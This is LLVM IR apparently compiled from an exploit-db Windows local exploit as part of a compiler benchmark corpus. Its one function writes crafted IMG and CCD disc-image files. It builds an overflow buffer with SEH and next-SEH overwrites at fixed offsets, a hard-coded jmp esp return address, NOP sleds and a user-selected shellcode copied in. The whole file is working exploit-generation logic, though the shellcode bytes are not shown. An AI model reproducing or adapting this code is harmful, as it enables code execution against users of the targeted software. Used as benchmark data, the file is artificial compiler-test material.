; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_11372.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_11372.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8* }

@.str = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@input = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@img = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [26 x i8] c"[!]Img file is: %d bytes\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"error writing img file\00", align 1
@__const.exploit.jmpesp = private unnamed_addr constant [5 x i8] c"\ED\1E\94|\00", align 1
@overflow = common dso_local global i8* null, align 8
@seh = common dso_local global i8* null, align 8
@nseh = common dso_local global i8* null, align 8
@s = common dso_local global %struct.TYPE_2__* null, align 8
@ccd = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [23 x i8] c"error writing ccd file\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"[!]CCD file is: %d bytes\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32*, align 8
  %7 = alloca [5 x i8], align 1
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %10 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64* @input)
  %11 = load i8*, i8** %3, align 8
  %12 = call i32* @fopen(i8* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %12, i32** %6, align 8
  %13 = load i32*, i32** %6, align 8
  %14 = icmp ne i32* %13, null
  br i1 %14, label %15, label %28

15:                                               ; preds = %2
  %16 = load i8*, i8** @img, align 8
  %17 = load i32*, i32** %6, align 8
  %18 = call i32 @fwrite(i8* %16, i32 1, i32 109974, i32* %17)
  %19 = load i32*, i32** %6, align 8
  %20 = load i8*, i8** %3, align 8
  %21 = call i32 @getFsize(i32* %19, i8* %20)
  store i32 %21, i32* %5, align 4
  %22 = load i32, i32* %5, align 4
  %23 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i32 %22)
  %24 = load i32*, i32** %6, align 8
  %25 = call i32 @fclose(i32* %24)
  %26 = load i8*, i8** @img, align 8
  %27 = call i32 @free(i8* %26)
  br label %31

28:                                               ; preds = %2
  %29 = call i32 @print(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %30 = call i32 @exit(i32 0) #4
  unreachable

31:                                               ; preds = %15
  %32 = bitcast [5 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.exploit.jmpesp, i32 0, i32 0), i64 5, i1 false)
  %33 = load i8*, i8** @overflow, align 8
  %34 = call i32 @gen_random(i8* %33, i32 10974)
  %35 = load i8*, i8** @overflow, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 5067
  %37 = load i8*, i8** @seh, align 8
  %38 = call i32 @memcpy(i8* %36, i8* %37, i32 4)
  %39 = load i8*, i8** @overflow, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 5063
  %41 = load i8*, i8** @nseh, align 8
  %42 = call i32 @memcpy(i8* %40, i8* %41, i32 4)
  %43 = load i8*, i8** @overflow, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 5071
  %45 = call i32 @memset(i8* %44, i32 144, i32 900)
  %46 = load i8*, i8** @overflow, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 5081
  %48 = load %struct.TYPE_2__*, %struct.TYPE_2__** @s, align 8
  %49 = load i64, i64* @input, align 8
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %48, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load %struct.TYPE_2__*, %struct.TYPE_2__** @s, align 8
  %54 = load i64, i64* @input, align 8
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i64 %54
  %56 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i32 0, i32 0
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @strlen(i8* %57)
  %59 = call i32 @memcpy(i8* %47, i8* %52, i32 %58)
  %60 = load i8*, i8** @overflow, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 843
  %62 = getelementptr inbounds [5 x i8], [5 x i8]* %7, i64 0, i64 0
  %63 = call i32 @memcpy(i8* %61, i8* %62, i32 4)
  %64 = load i8*, i8** @overflow, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 847
  %66 = call i32 @memset(i8* %65, i32 144, i32 10)
  %67 = load i8*, i8** @overflow, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 857
  %69 = load %struct.TYPE_2__*, %struct.TYPE_2__** @s, align 8
  %70 = load i64, i64* @input, align 8
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i64 %70
  %72 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %71, i32 0, i32 0
  %73 = load i8*, i8** %72, align 8
  %74 = load %struct.TYPE_2__*, %struct.TYPE_2__** @s, align 8
  %75 = load i64, i64* @input, align 8
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %74, i64 %75
  %77 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %76, i32 0, i32 0
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = call i32 @memcpy(i8* %68, i8* %73, i32 %79)
  %81 = load i8*, i8** %4, align 8
  %82 = call i32* @fopen(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %82, i32** %8, align 8
  %83 = load i32*, i32** %8, align 8
  %84 = icmp ne i32* %83, null
  br i1 %84, label %85, label %102

85:                                               ; preds = %31
  %86 = load i8*, i8** @ccd, align 8
  %87 = load i8*, i8** @ccd, align 8
  %88 = call i32 @strlen(i8* %87)
  %89 = load i32*, i32** %8, align 8
  %90 = call i32 @fwrite(i8* %86, i32 1, i32 %88, i32* %89)
  %91 = load i8*, i8** @overflow, align 8
  %92 = load i8*, i8** @overflow, align 8
  %93 = call i32 @strlen(i8* %92)
  %94 = load i32*, i32** %8, align 8
  %95 = call i32 @fwrite(i8* %91, i32 1, i32 %93, i32* %94)
  %96 = load i32*, i32** %8, align 8
  %97 = call i32 @fclose(i32* %96)
  %98 = load i8*, i8** @ccd, align 8
  %99 = call i32 @free(i8* %98)
  %100 = load i8*, i8** @overflow, align 8
  %101 = call i32 @free(i8* %100)
  br label %105

102:                                              ; preds = %31
  %103 = call i32 @print(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  %104 = call i32 @exit(i32 0) #4
  unreachable

105:                                              ; preds = %85
  %106 = load i32*, i32** %8, align 8
  %107 = load i8*, i8** %4, align 8
  %108 = call i32 @getFsize(i32* %106, i8* %107)
  store i32 %108, i32* %9, align 4
  %109 = load i32, i32* %9, align 4
  %110 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i32 %109)
  ret void
}

declare dso_local i32 @scanf(i8*, i64*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @getFsize(i32*, i8*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @print(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @gen_random(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
